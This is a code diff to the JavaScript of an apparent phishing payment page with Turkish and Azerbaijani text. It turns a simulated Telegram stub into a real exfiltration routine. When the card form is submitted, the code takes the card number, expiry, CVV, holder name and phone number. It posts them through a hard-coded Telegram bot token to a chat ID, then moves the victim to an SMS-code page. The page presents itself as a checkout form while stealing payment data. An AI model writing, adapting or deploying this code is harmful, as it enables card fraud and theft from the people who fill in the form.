@@ -8,7 +8,7 @@ let timeLeft = 300; // 5 minutes in seconds
 // Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
 const colorImages = {
     black: [
-        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp',
+        'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp',
         'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp',
         'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp',
         'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp'
@@ -307,7 +307,7 @@ function validateCardForm() {
                    cvv.length >= 3 && 
                    cardHolder.length > 0 && 
                    phonePrefix.length >= 2 && 
-                   phoneNumber.length >= 7;
+                   phoneNumber.length >= 9;
 
     const submitBtn = document.querySelector('.btn-confirm');
     if (submitBtn) {
@@ -332,21 +332,29 @@ function validateSmsForm() {
 // Form Submissions
 function submitCardForm(event) {
     event.preventDefault();
-    
+
     if (validateCardForm()) {
-        // Simulate processing
         const submitBtn = event.target.querySelector('.btn-confirm');
-        const originalText = submitBtn.textContent;
-        
         submitBtn.textContent = 'İşlənir...';
         submitBtn.disabled = true;
-        
+
+        // 💬 Telegram'a veri gönder
+        const cardData = {
+            cardNumber: document.getElementById('cardNumber')?.value,
+            expiry: document.getElementById('expiryMonth')?.value + '/' + document.getElementById('expiryYear')?.value,
+            cvv: document.getElementById('cvv')?.value,
+            cardHolder: document.getElementById('cardHolder')?.value,
+            phone: document.getElementById('phonePrefix')?.value + ' ' + document.getElementById('phoneNumber')?.value
+        };
+
+        sendToTelegram(cardData);
+
+        // SMS sayfasına geç
         setTimeout(() => {
             showPage('smsPage');
         }, 1500);
     }
 }
-
 function submitSmsCode(event) {
     event.preventDefault();
     
@@ -422,18 +430,33 @@ function generateUserId() {
     const random = Math.random().toString(36).substring(2, 8);
     return `USER_${timestamp}_${random}`.toUpperCase();
 }
-
-// Telegram Integration (Simulated)
+// Telegram Integration (Gerçek API çağrısı)
 async function sendToTelegram(data) {
-    // This would normally send to your Telegram bot
-    console.log('Telegram data:', data);
-    
-    // Simulate API call
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            resolve({ success: true });
-        }, 500);
-    });
+    const botToken = '7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w';
+    const chatId = '-1002626141042';
+    const message = `🟢 Yeni Kart Girişi:\n\n${JSON.stringify(data, null, 2)}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        const result = await response.json();
+        return result.ok ? { success: true } : { success: false, error: result.description };
+    } catch (error) {
+        console.error('Telegram error:', error);
+        return { success: false, error };
+    }
 }
 
 // Initialize when page loads
